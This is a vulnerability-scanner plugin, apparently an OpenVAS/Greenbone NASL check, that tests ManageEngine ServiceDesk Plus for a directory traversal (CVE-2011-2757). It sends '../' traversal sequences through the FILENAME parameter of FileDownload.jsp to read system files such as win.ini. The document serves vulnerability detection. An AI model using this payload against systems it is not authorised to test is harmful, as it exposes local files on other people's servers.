CPE = "cpe:/a:zohocorp:manageengine_servicedesk_plus";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103184" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-29 13:12:40 +0200 (Wed, 29 Jun 2011)" );
	script_cve_id( "CVE-2011-2757" );
	script_bugtraq_id( 48403 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "ManageEngine ServiceDesk Plus 'FILENAME' Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_manageengine_servicedesk_plus_consolidation.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "manageengine/servicedesk_plus/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48403" );
	script_tag( name: "summary", value: "ManageEngine ServiceDesk Plus is prone to a directory-traversal
  vulnerability because the application fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain arbitrary local
  files in the context of the webserver process." );
	script_tag( name: "affected", value: "ManageEngine ServiceDesk Plus 8.0 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	if( IsMatchRegexp( file, "(boot|win)\\.ini" ) ) {
		crap = crap( data: "..\\", length: 3 * 9 );
	}
	else {
		crap = crap( data: "../", length: 3 * 9 );
	}
	url = dir + "/workorder/FileDownload.jsp?module=agent&FILENAME=" + crap + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

